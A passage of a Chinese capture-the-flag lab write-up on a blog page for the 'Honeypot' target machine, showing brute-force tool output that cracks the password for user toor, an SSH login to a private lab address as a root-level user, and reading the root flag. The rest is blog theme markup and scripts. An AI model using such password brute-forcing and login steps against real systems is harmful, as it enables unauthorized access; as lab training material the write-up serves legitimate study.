version: v1.0.0</span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string">🎯 Username | toor</span><br><span class="hljs-string">📖 Wordlist | pass.txt</span><br><span class="hljs-string">🔎 Status   | 320/325/98%/toor2025</span><br><span class="hljs-string">💥 Password | toor2025</span><br><span class="hljs-string">───────────────────────────────────</span><br></code></pre></td></tr></table></figure>
+
+<p>直接使用<code>toor:toor2025</code>进行登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh toor@192.168.2.41    <br> _   _                                    _   <br>| | | | ___  _ __   ___ _   _ _ __   ___ | |_ <br>| |_| |/ _ \| <span class="hljs-string">&#x27;_ \ / _ \ | | | &#x27;</span>_ \ / _ \| __|<br>|  _  | (_) | | | |  __/ |_| | |_) | (_) | |_ <br>|_| |_|\___/|_| |_|\___|\__, | .__/ \___/ \__|<br>                        |___/|_|             <br>toor@192.168.2.41<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Honeypot 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Mon Jun 30 11:27:43 2025 from 192.168.2.41</span><br><span class="hljs-string">toor@Honeypot:~# id</span><br><span class="hljs-string">uid=0(toor) gid=0(toor) groups=0(toor)</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>ROOT FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">toor@Honeypot:~# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-771e84c4-5494-11f0-9a89-b70422752e89&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/" class="category-chain-item">内部靶机/Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Honeypot</div>
+      <div>http://miao-sec.github.io/内部靶机-Maze-sec/Honeypot/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/Language/" title="Language">
+                        <span class="hidden-mobile">Language</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <link rel="stylesheet" href="/dist/APlayer.min.css"> <div id="aplayer"></div> <script type="text/javascript" src="/dist/APlayer.min.js"></script> <script type="text/javascript" src="/js/music.js"></script> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
